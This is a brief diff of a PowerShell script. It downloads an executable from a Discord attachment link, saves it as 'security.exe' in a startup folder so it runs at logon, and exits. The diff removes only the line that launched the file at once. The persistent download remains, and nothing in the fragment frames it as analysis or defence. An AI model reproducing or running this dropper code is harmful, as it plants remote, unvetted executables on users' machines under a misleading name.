@@ -3,5 +3,4 @@ $url = "https://cdn.discordapp.com/attachments/1342936036614869114/1345801143145
 $outputPath = Join-Path $startupFolder "security.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $outputPath
-& $startupFolder\security.exe
 [System.Environment]::Exit(0)
